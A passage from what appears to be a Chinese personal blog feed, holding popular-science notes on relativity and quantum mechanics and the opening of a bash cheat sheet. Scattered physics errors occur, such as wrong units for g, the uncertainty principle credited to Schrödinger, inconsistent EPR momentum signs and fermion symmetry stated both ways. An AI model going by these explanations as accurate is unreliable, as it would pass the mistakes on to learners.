400*0"></p><p>这是时间的光锥。只有光锥内的事件才是会受到影响的事件。<br>过去的光锥中的事件可以影响观察者，而观察者也可以影响未来光锥中的事件。<br>但是光锥外的事件是无法影响观察这，并且观察者也无法影响光锥外的事件。</p><h2 id="质量就是能量"><a href="#质量就是能量" class="headerlink" title="质量就是能量"></a>质量就是能量</h2><h3 id="速度叠加"><a href="#速度叠加" class="headerlink" title="速度叠加"></a>速度叠加</h3><p>我们想象一下这样的场景，在火车上射出一支箭。火车的速度是$200m/s$，射出去的箭是$100m/s$。那么在外面的人来看。这个箭的速度应该是 $200 + 100 = 300m/s$ 。</p><p>那么是不是可以类推，在$0.8c$的飞船上，射出$0.5c$的火箭，那么就是 $0.8c + 0.5c = 1.3c$ 而超光速了呢？</p><p>爱因斯坦给出的答案是NO。因为<em>必须考虑到时间膨胀和长度收缩的效应。</em><br>其中$v$是飞船相对于地面的速度，$u’$是火箭相对于飞船的速度，$u$是火箭相对于地面的速度。<br>火箭相对于地面的速度并不是简单的$v + u’$ 。通过以下公式</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/960631862.jpg" alt="Alt text | center | 200*0"></p><p>通过公式的出来的速度为$0.928c$，是没有超过光速的。<br><strong>如果$u’$ 和 $v$ 都远小于光速$c$的时候，那么这个公式就可以近似为$u = u’ + v$ 和我们生活定律一样。</strong></p><h3 id="质量变重"><a href="#质量变重" class="headerlink" title="质量变重"></a>质量变重</h3><p>现在来看另外一个例子</p><p>你在飞船上，我在地面上。飞船相对于地面有一个很高的速度。但是你坐在飞船里，飞船相对于你的速度为0。<br>你可以让飞船加速，你会产生推背感。并且一直保持有推背感，那么你是不是会觉得你速度越来越快，都快到达光速了呢。<br>但是在地面的我看来，你就想是个油腻的中年人，越走越慢。</p><p>就等效于你的质量越来越重，所以加速度越来越小。</p><ul><li>这就是相对论的另一个效应：<strong>高速运动物体的质量会变重</strong>。质量变重的形式和时间膨胀一样</li></ul><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/52857151.jpg" alt="@m0是物体静止时候的质量 | center | 200*0"></p><p>可以从公式中看出来，当速度$v$越接近$c$，分母就越小。所得到的$m$就越大。</p><blockquote><p>相对论的几个效应可以用类比联想的方式记忆： <strong>运动会让你<em>更年轻</em>（时间膨胀）、<em>变瘦</em>（长度收缩），和<em>变结实</em>（质量变重）</strong> </p></blockquote><ul><li><strong>一切有质量的物体都不可能达到光速</strong></li><li>只有光子没有质量所以达到了光速。它不会变老，要么运动，要么消失。</li></ul><h3 id="E-mc-2"><a href="#E-mc-2" class="headerlink" title="$E = mc^2$"></a>$E = mc^2$</h3><p>那么现在又有一个问题了，这些增加出来的质量，是多在了哪里？</p><ul><li>爱因斯坦产生了这样的一个洞见： <strong>$mc^2$代表了一个物体的<em>全部能量</em> – 哪怕他静止不动，也有能量。</strong><br>这就是“质能方程”。</li><li><strong>物质和能量是一回事。</strong></li></ul><p>这就是狭义相对论</p><h2 id="广义相对论"><a href="#广义相对论" class="headerlink" title="广义相对论"></a>广义相对论</h2><h3 id="广义相对原理"><a href="#广义相对原理" class="headerlink" title="广义相对原理"></a>广义相对原理</h3><ul><li><strong>在所有坐标系下，物理定律都是一样的。</strong></li></ul><h3 id="加速度和引力"><a href="#加速度和引力" class="headerlink" title="加速度和引力"></a>加速度和引力</h3><p>我们可以想象一个这样的场景。<br>你处于一个一直做加速运动的火箭里。 你会感觉到一个力，这个力向下。此时你抛一个小球，这个小球也会朝着地面的方向掉落。那么这个实验和在地球上抛小球通过引力落回地面上有区别吗？</p><p><img src="/2021/07/06/%E7%9B%B8%E5%AF%B9%E8%AE%BA/1225873056.jpg" alt="Alt text | center | 300*0"></p><p>爱因斯坦说，<strong>我在火箭内部做实验，观测不到任何的区别</strong></p><h3 id="自由落体和匀速直线运动"><a href="#自由落体和匀速直线运动" class="headerlink" title="自由落体和匀速直线运动"></a>自由落体和匀速直线运动</h3><p class='quest'>自由落体是一个加速运动，但是为什么爱因斯坦说它跟匀速直线运动没有区别呢？<p class='answer'>**因为自由落体状态下物体的加速度都是一样的。**<p>我们知道，在地球上加速度G是一个恒定的数值$9.8m/s$<br>只有这样，两个质量不同的小球才会在同时下落的情况下同时到达地面。</p><ul><li><strong>在任何局部实验中，引力和加速度运动无法区分。</strong></li></ul><h3 id="广义相对论的结论"><a href="#广义相对论的结论" class="headerlink" title="广义相对论的结论"></a>广义相对论的结论</h3><ul><li>一个有质量的物质，会弯曲它周围的时空。这叫<em>“物质告诉时空如何弯曲”</em>。</li><li>在不受外力的情况下，一个物体总是沿着时空中的测地线运动。这叫<em>“时空告诉物质如何运动”</em>。 </li></ul><p>这里面不需要引力。</p>]]></content>
      
      
      <categories>
          
          <category> 科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>量子力学</title>
      <link href="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/"/>
      <url>/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>量子力学是描述微观粒子的物质行为的物理学理论，量子力学是我们理解除了万有引力之外的所有基本力的一个基础。这些基本力包括了电磁相互作用、强相互作用和弱相互作用。</p><p>量子力学主要是用来描述粒子在微观尺度下的行为，所有的粒子现象无法用经典力学精确描述。</p><p>为什么要了解一下量子力学？<br>我想，去了解一下这个世界上最聪明的那群人在思考些什么，这个事本身就非常有趣。</p><h2 id="量子力学的前夜"><a href="#量子力学的前夜" class="headerlink" title="量子力学的前夜"></a>量子力学的前夜</h2><p>在经典力学完备的情况下，19世纪末人们普遍认为经典物理已经非常完备了，只需要再解决两个小小的乌云就可以将物理学大厦封顶。后面的物理学家再修修补补一下就可以了。</p><p>但是，这两个小小的乌云却有点怪。</p><p>这两个乌云都与光有关，第一个是为什么光速再任何方向上都保持不变，这个直接导致了爱因斯坦发现了狭义相对论。<br>第二个是关于黑体辐射。</p><h3 id="紫外灾难"><a href="#紫外灾难" class="headerlink" title="紫外灾难"></a>紫外灾难</h3><p>紫外灾难是说，经典物理学解释黑体辐射问题与实验结果不符的历史事件。</p><p>黑体辐射问题，问的是黑体辐射强度与能量之间的关系。</p><blockquote><p>所谓黑体，就是物体不反射光，只会自身发光，比如太阳，烧红的烙铁</p></blockquote><p>实验物理学家给出了黑体辐射光频率的的分布曲线，但是这个曲线为什么是这样的，理论物理学家通过经典物理学无法解释。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/20210116123203.jpg"></p><p>这个时候，普朗克出来了，他通过纯数学凑数的办法，凑出了一个公式，而这个公式完美符合曲线。</p><p>但是这个公式怎么解释呢，最后发现，只要满足一个物理假设，就可以推导出这个公式，那就是要求每一个电子震动产生的无线电波的的能量不是连续的，而是<strong>一份一份</strong>的 。</p><p>$E = nhf$ 这里 n = 1, 2, 3 …<br>其中$f$是频率，$h$是常数，现在称为<strong>普朗克常数</strong>， h=6.626 * 10 ^(-34) 焦耳*秒。</p><p>这样就避免了紫外灾难。</p><p>但是普朗克并不清楚这<strong>一份一份</strong>意味着什么。</p><h3 id="光电效应"><a href="#光电效应" class="headerlink" title="光电效应"></a>光电效应</h3><p>光电效应是说光打到金属板上会由电子跑出来的现象。电子跑出来多少只与光是什么颜色的（频率）有关，而与这个光的强度无关。这个实验与经典力学是不符的，因为经典力学认为强度积攒多了也可以跑出电子来。</p><p>这时候爱因斯坦出来了，说这是因为光是一份一份的，普朗克不是说了么，光的一份能量是$E=hf$，频率越高能量越大，所以高频率的光的一份能量才足够大，才能打动电子。</p><p><em>可以打一个比方，拿石头去砸墙，光的频率就是石头的大小，你用大石头去砸墙就会有石膏掉落，但是用小石子却不会掉落。</em></p><p>这里的关键是爱因斯坦将普朗克的假说来了个思维跃迁，认为只要是光，能量就是一份一份的。</p><p>由紫外灾难引发了普朗克对黑体中电子受热震动的能量是一份一份的思考，然后由爱因斯坦提出了，<strong>光量子</strong>。</p><h3 id="什么是量子"><a href="#什么是量子" class="headerlink" title="什么是量子"></a>什么是量子</h3><p>普朗克与爱因斯坦的解题思路，叫做<strong>量子化</strong>，那么什么是量子呢。</p><p>比如高清电视，离得远了看非常丝滑，但是贴着看会有一个一个的晶体管，分辨率是有极限的，画面不是连续的，这个就是量子化。</p><p>那么为什么我们生活中感受不到世界是量子的呢，因为普朗克参数非常小，感觉不到。也就是分辨率太高了。</p><h2 id="经典量子力学"><a href="#经典量子力学" class="headerlink" title="经典量子力学"></a>经典量子力学</h2><h3 id="原子的内部结构"><a href="#原子的内部结构" class="headerlink" title="原子的内部结构"></a>原子的内部结构</h3><p>《庄子》中有句话：“一尺之棰，日取其半，万世不竭”，这句话在物理上是错的。</p><p>我们知道，分子是由原子组成的，原子是由原子核和电子组成的，原子核是由质子和中子组成的，质子和中子又是由夸克组成的。但是夸克是由什么组成的呢？ 现代物理学的标准模型认为，夸克和电子为<strong>基本粒子</strong>，是不可再分的。</p><p>就比如一本书，你可以分为章节，段落，句子，词，字，但是字就不可再分了，因为他们是抽象概念，无需再分。</p><p>而物质怎么分，正是量子力学的开始。</p><p>1896年，居里夫人发现铀原子能执法的往外发射某种射线，这个现象被称为”发射性“，并确定这个反应不是原子与原子之间发生的，而是由原子自身发出的，由此推断<strong>原子内部还有结构</strong></p><h3 id="波尔的原子模型"><a href="#波尔的原子模型" class="headerlink" title="波尔的原子模型"></a>波尔的原子模型</h3><p>1911年，汤姆生领导的一个研究小组发现了一种带着一个单位负电荷且质量极小的基本粒子并把它命名为电子。</p><p>卢瑟福和其学生通过金箔实验，物理学家认识到物质的内部几乎是真空的，原子核只占了原子很小的一部分。</p><blockquote><p>金箔实验：实验是用α粒子轰击各种金属箔纸，发现绝大多数α粒子的偏向很小，但少数的偏向角很大甚至大于90度。由此可以证明，一个原子大部分的体积是空的空间，这由没有被弹回的粒子充分说明。</p></blockquote><blockquote><p>这个实验推翻了约瑟夫·汤姆孙创建的汤姆孙模型 。根据这模型，原子是由电子悬浮于均匀分布的带正电物质里所组成。这个实验为建立现代原子核理论打下了坚实基础。</p></blockquote><p>卢瑟福的模型是电子围绕在原子核周围，但是现在由两个问题：</p><ol><li>电子是如何保持稳定轨道的？</li><li>原子的确会对外辐射，而不受干扰也会辐射，但是原子辐射的光谱很独特，不是连续的。</li></ol><p>接下来波尔登场。</p><p> 波尔想到了普朗克和爱因斯坦的解题思路，量子化。所以决定对电子的轨道量子化。并提出4个假设：</p><ol><li>电子平时按照特定的轨道运动，每个轨道由自己的能级，能级和“轨道量子数”成反比</li><li>电子在同一个轨道中运动时，并不向外辐射能量。</li><li>只有当电子在两个不同能级之间跃迁的时候，它才会辐射能量。</li><li>电子轨道有个角动量，角动量也要量子化。</li></ol><p>这个模型非常成功，光电效应不是说外来一个高能量的光子能把电子打飞么，需要多大的能量呢？答案是正好是那个电子所在能级的能量。</p><p>波尔还能明明白白地告诉你原子中如果有多少个电子，那么他们将如何排列，波尔等于解释了整个化学。</p><h3 id="波粒二象性"><a href="#波粒二象性" class="headerlink" title="波粒二象性"></a>波粒二象性</h3><p>什么东西即是波又是粒子，这就叫“波粒二象性”。我们仔细想想，这个东西会有什么样的行为。</p><p>如果电子是一个点，那么它如何展现”波动“的特性呢？它是不能走”之“字型路线的，因为会有急转弯，而导致加速运动，发生辐射，另外会超过光速，违反了相对论。</p><p>而如果电子是一片波动的云，那么我们为何每次都能捕捉到一个点的呢？从云到点的变化是如何发生的。</p><p>杨氏双缝实验，如果一个一个的发射电子，最后的出来的也会是干涉条纹。那么是谁与电子发生的干涉？是自己和自己吗？一个电子是如何同时通过了两个缝隙发生了自己与自己的干涉？</p><h2 id="现代量子力学的发展"><a href="#现代量子力学的发展" class="headerlink" title="现代量子力学的发展"></a>现代量子力学的发展</h2><h3 id="不确定性原理"><a href="#不确定性原理" class="headerlink" title="不确定性原理"></a>不确定性原理</h3><blockquote><p>海森堡解释了不确定性原理。当时的他并没有意识到，这个原理即代表了物理学的探索边界，又是量子世界最核心的规则。</p></blockquote><p>海森堡说，电子有时候表现的像粒子，有时候又表现的像个波，那么它到底是什么，这个我们无法想象，也没有必要想象。</p><p>应该关心的是<strong>可测量</strong>的东西，电子的轨道其实是不可测量的。</p><p>如果想要得到电子的路线图，那么需要同时知道电子的位置和速度（也就是动量$p=mv$），但是，海森堡说，这个是不可能的，你无法同时精确的知道电子的位置和动量。</p><p><strong>位置的测量误差和动量的测量误差是一个取舍关系，他们不可能都很小</strong></p><p>这个解释很有道理，但是还不够彻底，还不够革命。</p><p>海森堡说的是测不准，说的是你的测量手段本身相悖。因为想测量一个东西就不得不干扰这个东西。但是并不是这样的。</p><p>量子力学正在的观点不是<strong>测不准</strong>，而是<strong>不确定</strong>。不是你能力的问题，而是电子的本性问题。</p><p>电子根本不能同时拥有确定的位置和动量。电子的行为有内在的不确定，永远都是模糊的。</p><p>这个原理就是<strong>海森堡不确定性原理</strong>。</p><p>下面这个图才是原子的样子。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/95b07a231f127e8656732a1396fab30.png" alt="Alt text | center | 300*0"></p><p>电子并不是绕着原子核做圆周运动，电子没有确定的位置，它同时出现在原子核之外的各个地方，呈现出来的是的是一片”云“，其实原子核也是一片”云“。</p><p><strong>”不确定“是量子世界的本质，海森堡要求我们专注于那些能测量的东西，坦然接受测量结果的不确定性。</strong></p><p>直到今天，我们也只是知道电子的一些”性质“，但是电子到底是个什么东西，我们并不知道。</p><h3 id="薛定谔的波动方程"><a href="#薛定谔的波动方程" class="headerlink" title="薛定谔的波动方程"></a>薛定谔的波动方程</h3><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/ebb011724d8c83747d5703f4412b942.png" alt="Alt text"></p><p>这个方程描述了<strong>波函数</strong> $ψ(x,t)$ 在不同位置和时间的变化。</p><p>有了薛定谔的方程，我们就可以精确的知道波函数在任何时间位置的数值。</p><p>但是波函数到底指的是什么，这时候的薛定谔并不清楚。后来德国物理学家马克斯·玻恩提出了解释</p><blockquote><p>波函数绝对值的平方，等于粒子出现在那个时间和那个地点的概率</p></blockquote><p>没有被观测的粒子就好像是一片与，它既可以在这里也可以在那里，但是它出现的概率是不一样的，如果是0就绝对不可能出现。</p><p>但是这里有两个问题：</p><ol><li>玻恩解释说明量子力学是一个关于概率的科学。</li><li>波函数是一个十分怪异的存在。</li></ol><p>为什么怪异？ 当电子打到屏幕上，位置固定下来以后，波函数瞬间就在其他位置都变成了0。这叫<strong>波函数的坍缩</strong>。电子从一个”波“坍缩成了”粒子“。那么这个过程中发生了什么呢？</p><p>本来是全局的，坍缩后突然变成了一个点。这个过程是不连续的，是不可逆的。</p><h3 id="量子隧穿"><a href="#量子隧穿" class="headerlink" title="量子隧穿"></a>量子隧穿</h3><p>在经典力学中，小球是不可能凭空穿过一面墙的。但是在微观的量子世界中，穿过墙壁只是一个概率问题。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/8588f9399d49ecaebaa74b9af313276.png" alt="Alt text | center"></p><p>图中的E是粒子的能量，而V是墙的势能。 墙的势能V比粒子的能量E高，所以墙对粒子造成了限制。</p><p>波函数在经过墙迅速衰减，虽然波动幅度小了，但并不是一条直线，所以根据玻恩解释，粒子是可以到达墙后面的。</p><p>能量小的粒子穿过了势能大的物质，就叫做<strong>量子隧穿</strong>。</p><p>量子隧穿在很多方面都有应用和体现：</p><ol><li><p>质子和中子的动能比结合力的势能小，但是他们能跑出来，这就造成了发射性原子核衰变。这是量子隧穿的功劳。</p></li><li><p>核聚变要求原子核与原子核克服库仑位势垒，单独的热能无法达到以促成核聚变。但是量子隧穿能够突破，才有了核聚变，才有了太阳。</p></li><li><p>DNA的自发性突变，质子隧穿透过了DNA的碱基对的氢键位势垒，使得DNA复制中发生突变，这才有了丰富多样的世界。</p></li></ol><h3 id="狄拉克引领的量子电动力学"><a href="#狄拉克引领的量子电动力学" class="headerlink" title="狄拉克引领的量子电动力学"></a>狄拉克引领的量子电动力学</h3><p>保罗·狄拉克融合了狭义相对论的波动方程叫做<strong>狄拉克方程</strong>，这个方程解出了两个新东西：</p><ol><li>有正电子， 这个是人类发现的第一个反物质</li><li><strong>自旋</strong></li></ol><p class='quest'>什么是自旋？<p class='answer'>电子绕着原子核做旋转之外，自身还有一个旋转，这个自身旋转的角动量是“量子化”的，也就是说它的角动量只有“1/2”和“-1/2”两个值，我们把电子的自身旋转称为自旋。<p>但是，请注意，这里的自旋是无法形象的理解的。电子的自旋为1/2，那么把电子想象成小球的话，这个小球必须转两圈才能回到原来的样子。并且根据自旋角动量的计算，这个小球的表面速度已经超过了光速，这个不合理。</p><p>另外需要注意的是，到目前为止，物理学家对电子的理解只是知道了它的各种内在属性，但是电子到底是什么我们并不清楚。</p><p>所以，<strong>自旋是电子的一个内在属性，是一个具有角动量特点的性质</strong></p><p>将电子自旋的状态标示，可以写成<br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/3ccc9de8992d16efc2275924a9c7259.png" alt="Alt text| center | 300*0"></p><p>狄拉克发明的“半个括号” （”**|&gt;<strong>“）表示了一个量子态，所以这个公式说的是电子的量子态是自旋方向上的两个正负量子态之和。这个就是“</strong>量子叠加态**”</p><p>电子的自旋描述的是一个方向上的电子的自旋的量子态，在另外一个方向上，有着另一个，完全不相干的自旋量子态。</p><p>比如说我们是在x方向上观察电子的量子态，可以得到<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/11af993e137cc9196dd1475e562ddc9.png" alt="Alt text | 200*0"><br>同样我们观测z方向上的电子的自旋量子态，可以得到<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/c34780b706571ea14ca0b34a798c5cd.png" alt="Alt text | 200*0"><br>这两个方向上的量子叠加态是互不相干的。</p><ul><li>现在我们更进一步：</li></ul><p>在我们观察z方向正1/2自旋电子后的，继续对这个电子进行x方向的观测，那么它同样会有x方向的叠加态<img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/aa96b3e5b76f2c313615001349d9fd6.png" alt="Alt text|200*0"></p><p>更进一步，如果继续在x方向对观测到的x方向的坍缩的电子进行观测，那么它保持原来的自旋态性质不变。</p><p>他的过程是下面这样的：<br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/aae536a7b0c30cb3717847ba22dffcf.png" alt="Alt text| center | 700*0"></p><p>这样的性质被<strong>冯·诺依曼投影公设</strong>解释：</p><ol><li>每个量子态，都可以展开成一系列基本的量子态的叠加  <img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/fa666bc9763be81afa3be6deb4b701c.png" alt="Alt text| 200*0"></li><li>一次实验观测后，系统就坍缩到其中的一个态e_i。而到底坍缩到哪个态，由系数c_i的绝对值的平方决定。</li><li>从此以后，系统就一直处于e_i态。但如果e_i态还有不确定性，系统就可以再次被观测到别的态，方法仍然使用量子态叠加展开。</li></ol><p>那么哪部分是属于量子电动力学的呢？<br>这么说吧。引力，属于广义相对论的范畴，原子核以内的属于更现代物理理论。不考虑引力，在原子核之外的所有的万事万物都归量子电动力学管</p><h3 id="泡利不相容原理"><a href="#泡利不相容原理" class="headerlink" title="泡利不相容原理"></a>泡利不相容原理</h3><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/85e27b3308331e0c1f638db77af2f2f.png" alt="Alt text | center | 500*0"></p><p>上图是电子云图，颜色的深浅代表了电子在一个地方被发现的概率。</p><p>完全确定电子的状态，需要4个“量子数”。</p><ol><li>主量子数<code>n</code>， 代表电子所处的能级，能级越高，电子出现在那里的概率越低。</li><li>角动量量子数 <code>l</code>,代表电子轨道的形状，也就是电子云的形状，l=0为球形，l越大，电子云越扁。</li><li>磁量子数<code>m</code>, 代表轨道的方向。</li><li>自旋量子数。</li></ol><p>泡利不相容原理说，<strong>一个原子的任何两个电子的是个量子数，不能完全相同。</strong></p><p>正因为有了泡利不相容原理，才能让电子不会全部集中在低能级上。大原子的势力范围才更大，才能有外层电子决定各种化学性质。世界才如此多姿多彩。</p><p>为什么电子会遵守泡利不相容原理呢？根本原因是自旋的数学。</p><p>所有的基本粒子分为两类：</p><ol><li><strong>玻色子</strong>， 它们的自旋是整数，它们是力的传播者，像胶子、介子、希格斯粒子和想象中的引力子都是玻色子。光子也是玻色子，自旋是1</li><li><strong>费米子</strong>， 它们的自旋是半整数，也就是±1/2、±3/2、±5/2这样，费米子是力的感受者。像电子、质子、中子都是费米子。</li></ol><p>在数学上，玻色子的波函数具有交换对称性，而费米子的波函数具有反交换对称性。两个全同费米子的波函数一定是交换对称的，而对称的中心点必须是0，而0代表了所有量子数都相同，所以量子数不能完全相同。</p><blockquote><p>简单的来说<br>之所以有化学，是因为泡利不相容原理；<br>之所以有泡利不相容原理，是因为费米子波函数是反对称的。<br>之所以费米子波函数是反对称的，是因为自旋；<br>之所以有自旋，是因为量子电动力学；<br><strong>设定了量子电动力学，就设定了原子核以外的世界</strong></p></blockquote><h3 id="全同粒子"><a href="#全同粒子" class="headerlink" title="全同粒子"></a>全同粒子</h3><p>在量子的微观世界，你是不能区分两个粒子的区别的，电子与电子，质子与质子，他们完全相同，没有任何区别，甚至连位置信息，因为薛定谔不确定性原理，你也不能通过位置来却别粒子。</p><h3 id="哥本哈根诠释"><a href="#哥本哈根诠释" class="headerlink" title="哥本哈根诠释"></a>哥本哈根诠释</h3><p>哥本哈根诠释并不是一套物理定律，而是一套物理研究方法和哲学立场</p><ol><li>量子力学只是关于测量结果的科学，它并不研究测量结果背后的”真相“到底是什么。</li><li>波函数只是一个描写概率的数学形式，而不是一个物理实在。</li><li>既然波函数根本不是物理实在，那么也就谈不上”坍缩“，所谓的坍缩也就是测量前后的数学信息变化而已。</li><li>波函数就是我们所能知道的全部信息。</li><li>为什么日常生活中的东西没有表现出量子力学的效应？因为宏观是众多粒子的集体行为。</li></ol><h3 id="爱因斯坦的最后一战"><a href="#爱因斯坦的最后一战" class="headerlink" title="爱因斯坦的最后一战"></a>爱因斯坦的最后一战</h3><p>1935年，爱因斯坦对量子力学发出最后一击。是一个思想实验，人们称为”EPR佯谬“。</p><p>这个思想实验是这样的：</p><blockquote><p>A和B两个全同粒子，它们本来是在一起的，然后因为原子核衰变分开了，然后它们沿着直线各自往相反的方向飞行。<br>根据动量守恒，A和B的动量必定是互为相反数，而且A走多远，B也一定走多远。<br>那么我只要测量一下A的位置是x，就知道了B的位置是-x。<br>我再测量B的动量是-p，那么A的动量就是-p<br>这样的话我就只对一个粒子测量了一次，但是却同时知道了它的位置和动量，违反了海森堡不确定性原理。</p></blockquote><p>爱因斯坦这个思想实验的所有测量都是合法的，没有犯任何错误。波尔阵营对此只能给出一个反驳：</p><p>A和B两个粒子应该被视为同一个量子系统，用一个波函数来描写。当测量A位置的时候，就相当于测了B的位置，从而破坏了B的动量。</p><p>这一次爱因斯坦没有接受，说，我这两个粒子可以距离几光年远再测量，如果测量A的同时就破坏了B的动量，这难道不是<strong>鬼魅般的超距作用</strong>吗？</p><p>对此波尔无言以对，波尔的唯一合理反驳就是量子系统真的有鬼魅般的超距作用。</p><p><strong>鬼魅般的超距作用，从此成为了量子力学的命门</strong></p><h3 id="鬼魅般的超距作用"><a href="#鬼魅般的超距作用" class="headerlink" title="鬼魅般的超距作用"></a>鬼魅般的超距作用</h3><p>贝尔在1964年提出了可证伪的实验理论设想：其中的关键结论是测量两端的结果满足”4% &gt; 1% + 1%“这样的不等式，如果满足，那么波尔是对的；不满足，爱因斯坦是对的。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/f6cfe3f7150c3746d309dfeecff898b.jpg" alt="Alt text| center| 300*0"><br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/59ea0217eeb68158caf0617fbe892bf.jpg" alt="Alt text | center | 300*0"></p><p>最后实验证明，波尔是正确的，真的有鬼魅般的超距作用，是两个粒子之间发生的协调，这就是<strong>量子纠缠</strong>。</p><ol><li>粒子的某个属性，比如自旋，是在被观测的那一刹那才确定下来的。而不是提前设置好的。</li><li>量子纠缠是发生在两个粒子之间的。</li><li>量子纠缠虽然是真的，但是不能用来传递信息。</li></ol><h3 id="波函数的空间感知超能力"><a href="#波函数的空间感知超能力" class="headerlink" title="波函数的空间感知超能力"></a>波函数的空间感知超能力</h3><p>有这么一个实验，实验装置如下：</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/543f5e38435fbbe4689bf1d44d992d8.jpg" alt="Alt text | center | 500 *0"></p><p>用波的视角来看光，最后只会在探测器2上接受到光，因为波的干涉原理，这里是经典物理学范畴。</p><p>现在以粒子的视角来看看，每次只发射一个光子，那么会出现情况呢？<br>光子每一次通过分束器都有一半的概率被反射或者透过。那么是不是说探测器1就有一半的几率接受到这个光子？</p><p>答案是不对，这是因为光子会<strong>同时</strong>走过两条路径，在分束器2的时候，光子会自己与自己发生干涉，抵消掉去往探测器1的光子。实验结果与经典物理学一样。 这是怎么回事呢？</p><blockquote><p>光子在出发前的那一刹那，它的波函数，就对所有的路径、干涉仪全局的设置，有一个总体感知。是这个”<strong>总体感知</strong>“告诉光子应该如何运动。<br>也就是说光子即走了路径1，也走了路径2，这个光子处于两条路径的“量子叠加态”。</p></blockquote><p>第二个实验是探测炸弹实验，问如何用光学的方法探测是否有炸弹。这个炸弹无比敏感，对一个光子就会发生爆炸。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/01177690293872659e441e2be78b309.jpg" alt="Alt text | center | 500*0"></p><p>通过实验可以发现，有1/4的概率，探测器1会收到光子。那么只要4次里面有一次在探测器1上收到了光子，那么炸弹一定存在。（真实实验中，可以通过微调，将概率无限接近于1）</p><p>为什么会在探测器1上收到光子呢？因为光子在出发的一瞬间就知道路径2被阻断了，无法与自己干涉，所以在会出现在探测器1上。也就事说光子在去到分束器1的时候，就发生了坍缩，而导致只有路径1可以被选择。</p><p>这样，就做到了经典物理中无论如何也无法完成的探测炸弹的事。<strong>量子力学可以传递出经典物理禁止传递的信息</strong>。</p><blockquote><p>光子要有粒子性，波函数要有感知能力，这两个条件加起来才叫做量子力学。</p></blockquote><h3 id="波函数的时间感知能力"><a href="#波函数的时间感知能力" class="headerlink" title="波函数的时间感知能力"></a>波函数的时间感知能力</h3><p>有这么一个实验，实验装置如下：</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/ec47544409c42535bb276ed24b0738d.jpg" alt="Alt text| center | 500*0"></p><p>D1 和 D2 是测量光子粒子性的观测器，而可移动的屏幕可以理解为测量光子波动性的观测器。当用可移动的屏幕挡住D1和D2的时候，光子表现出来的是波的特性，有干涉条纹。而拿掉屏幕，用D1和D2作为观测的时候，不会发生干涉，会接收到每一个光子，表现出来的是粒子性。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/b13faead4f0ba2aa96fe072d215ee51.png" alt="Alt text | center | 500*0"></p><p>也就是说，你想测量光子的波动性，那么光子就会表现出波的特性。如果你想测量光子的粒子性，那么光子就会表现出粒子性。<strong>光子是表现波还是粒子，取决于你问他什么问题</strong></p><ul><li><strong>惠勒的延迟选择</strong></li></ul><p>现在进一步实验，当我们在光子通过双缝之后，再决定是观察什么，那么光子会表现出来什么性质呢？<br>答案是，还是会表现出想要观测的性质。这意味着我们现在的选择，改变了过去的事件。</p><p><strong>量子纠缠实验证明波函数有超越时空的感知能力，延迟选择实验证明波函数有超越时间的感知能力</strong></p><p>但请注意，这种超越时间的感知能力只能影响，不能控制波函数，所以没有违反相对论。</p><p class='quest'>光子在测量前的一瞬间改变了性质，那会不会是它同时处于粒子与波的叠加态，然后测量的时候坍缩了呢？<p class='answer'>并不是，如果想要表现波的一面，那么就必须了解两条路径，积累到相应的相位差，才能正好形成干涉；而如果想要表现出粒子性，就必须真的走过一个缝，才能形成有缝的统计结果。它必须记得路上的情况才行。关键不在于它最后的坍缩的表现，而是他如何知道路径上的信息，它是如何过来的。]]></content>
      
      
      <categories>
          
          <category> 科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 速查表</title>
      <link href="/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">msg=<span class="hljs-string">&quot;hello world&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$msg</span></span></code></pre></div></div><p><strong>变量名的命名须遵循如下规则：</strong></p><ul><li>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</li><li>中间不能有空格，可以使用下划线（_）。</li><li>不能使用标点符号。</li><li>不能使用bash里的关键字（可用help命令查看保留关键字）。</li></ul><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><div 